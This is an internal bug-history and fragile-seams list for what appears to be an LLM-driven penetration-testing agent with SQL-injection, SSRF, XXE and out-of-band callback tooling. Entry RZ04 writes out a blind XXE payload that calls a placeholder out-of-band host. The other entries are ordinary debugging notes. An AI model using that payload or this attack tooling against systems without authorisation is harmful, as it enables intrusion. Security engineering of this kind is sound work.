# 11 — RISK ZONES: where bugs historically lived + fragile seams

Audit waves: probe these FIRST. Every entry is a real bug that
happened in this codebase (fixed) or a seam that is still fragile.

## Historical bugs (all fixed — regression-hunt these)
- RZ01 Rails rounding: pending() rounding shares to 3 decimals broke
  the re-arm comparison (0.983 < 0.98333 → instant re-arm after
  delivery). Shares are RAW floats, forever.
- RZ02 Rails fixture math: 60/60 403 = share 1.0 — "worsening" can't
  re-arm (1.0 !< 1.0); 10/55 = 18.2% ≠ 20% arming. Test fixtures MUST
  read the module constants (_WALL_SHARE, _MIN_N...) first.
- RZ03 Breaker phantom status: -2 never existed anywhere in the fleet
  — the observer was marking a ghost. Statuses that exist: real HTTP
  ints, -1 transport death, -3 quarantine skip. NOTHING ELSE.
- RZ04 XXE blind payload: the first draft referenced undefined %file;
  and &xxe; in the body — strict parsers ERROR before resolving
  %remote; → callback never fires. The declaration is a PURE callback
  (`<!ENTITY % remote SYSTEM "http://{oob}/probe">\n%remote;`), the
  body is inert.
- RZ05 Mid-conversation system message: the rails graft originally
  appended a system role mid-convo — strict providers (OpenAI/
  DeepSeek/GLM) 400 on the NEXT request → 3 consecutive failures →
  mission dead. EVERYTHING rides tool-result content.
- RZ06 _rail_note staleness: a note leaked into subsequent tools' 
  results when locals.get() was used — reset to "" at the head of
  EVERY tc iteration.
- RZ07 Redirect/proxy coalesce-key loss: sub-calls return early,
  bypassing the epilogue publish — cache silently misses on every
  rotated/redirected fetch. The key is threaded manually.
- RZ08 Coalescer corpse: `out` unbound in finally when make() raises
  → NameError inside finally → joiners never wake. Init out=None
  before try; publish only when not None; else corpse-wake.
- RZ09 Datastore str→dict: cascade fills AFTER _coerce_args; a JSON-
  string global for a headers param stayed a string. _coerce_one
  re-coerces filled values per schema.
- RZ10 Ω1 deep-status fake-violation: sts[:8] check on 30-status
  outputs faked violations when the match sat past index 8. Check
  scans ALL; only notes are display-bounded.
- RZ11 Ω1 _pred_key nested-args crash: sorted(args.items()) TypeErrors
  on dict values. json.dumps(sort_keys, default=str).
- RZ12 Ω1 heal-mismatch: the frozen prediction of attempt 1 measured
  against attempt 2's healed output. Re-parse per attempt.
- RZ13 Twin phantom interface: core.llm has NO module-level chat().
  The real interface: LLM(base_url, api_key, model).chat(messages,
  max_tokens) → {content, tool_calls}.
- RZ14 Twin blind cap overreach: capping inline-confirmed verdicts
  (signals ≥ 1) — the tool's own differential is proof. Cap fires on
  CONTRADICTION only.
- RZ15 Twin graft placement: first graft sat AFTER transcript/
  blackboard/workspace — archives consumed the uncapped out. The cap
  precedes ALL consumers.
- RZ16 Dream props starvation: untaken_branches didn't carry asset
  props → simulate_branch saw no evidence → zero plays, silently.
- RZ17 Dream frozen play-file const: _PLAY_FILE computed at import;
  monkeypatched _INTEL ignored. Paths that tests patch are functions.
- RZ18 Dream cross-target poisoning: plays minted for A fed B's round
  0. Plays are target-stamped; load_plays filters.
- RZ19 Dream bind: bind_mission read self.target which doesn't exist
  on Agent — extract_target(mission) is the way.
- RZ20 Doctrine goal-regex consumption: 'Goal:' ate the following
  pair ('keys' as its value). Reserved words never consume.
- RZ21 Doctrine decay overkill: (1-0.72)*score → one failure =
  instant graveyard. Laplace blend (0.6*rate + 0.4*old).
- RZ22 Doctrine deadlock: report_use (holding Lock) called save()
  (acquiring Lock) — threading.Lock is NOT reentrant. RLock.
- RZ23 skip_summary shape mismatch: doctrine expected counts/examples,
  the ledger emits by_reason/example. Consumers verify the REAL shape.
- RZ24 Forge Windows race: import_module right after writing the file
  — the FileFinder's directory cache missed it (flaky 1/3).
  importlib.invalidate_caches() before every hot-load.
- RZ25 Forge graft misplacement (mine): an insertion script anchored on
  the wrong msgs.append (line -60) — the block landed inside the
  coverage branch. Insertions anchor on VERIFIED unique context.
- RZ26 Universal-ctx blindness (calib-B): mint_wins/skip_taught minted
  context "any-target" — round0_block's literal filter excluded it →
  the doctrine was INVISIBLE for whole missions (no event, used=0
  forever). _UNIVERSAL_CTX sentinels ride everywhere now; guard z01b.
- RZ27 String-typed integer params (calib-B): race_smash schema lacked
  "type": "integer" → _coerce_args passed "3" raw → range("3") crash.
  The LLM stringifies numbers; EVERY schema property that is a count
  must declare its type. Sweep pending for other tools.
- RZ28 Test-to-real-file pollution (calib-A): any test exercising
  save-paths (autopsy, retire) WITHOUT monkeypatching the store paths
  writes the real intel/doctrine.json — mission round-0 then reads test
  noise as law. Rule: every doctrine test patches _DOCTRINE_FILE.

## Fragile seams (live — probe with intent)
- FS1 The two _NOISE_TOOLS copies (stop_rails.py + agent.py) must stay
  in sync — no test enforces it yet.
- FS2 world_model/reset + rails reset are process-wide: two CONCURRENT
  missions cross-reset each other (console is single-mission; the
  swarm runs specialists in-process — outer mission + specialist both
  calling run() could race). Watch for swarm-mode oddities.
- FS3 _doctrine_armed staleness after a concurrent doctrine load() —
  verdicts drop as no-ops (documented). If swarm symptoms appear,
  arm by TRIPLE not by ref.
- FS4 trajectory args-digest matching in untaken_branches is heuristic
  (value[:80] in args str) — a tool that ran on the target WITHOUT the
  asset string in its args shows as untaken. Plays are suggestions;
  acceptable, but calibrate against live missions.
- FS5 The comparator (Ω1 1.2) + noise floors (Ω1 1.3) APIs are NOT
  yet wired into live tools — dead code until sqli/dir tools adopt
  them. Calibration missions should adopt or prune.
- FS6 The truth table (Ω2 2.2) is not yet wired into sqli blind tools
  — same adoption gap as FS5.
- FS7 mission_globals cascade coercion: only _CASCADE_KEYS map;
  anything outside the closed map silently doesn't cascade (by
  design — but operators will expect cookie→any-param).
- FS8 twin _TWIN_CACHE is process-wide; two missions share the budget
  window (40/h) — heavy twin use in one starves the other.
- FS9 OOB channel has no live poller wired (config/oob.yaml poll_url)
  — process_interaction exists but nothing polls it in a mission
  loop; ssrf/xxe receipts only fill via the poll endpoint or tests.
- FS10 doctrine load() at EVERY round 0 re-reads the file while
  another mission's autopsy may be writing it — save is not locked
  against load (same-process RLock protects; cross-process nothing).
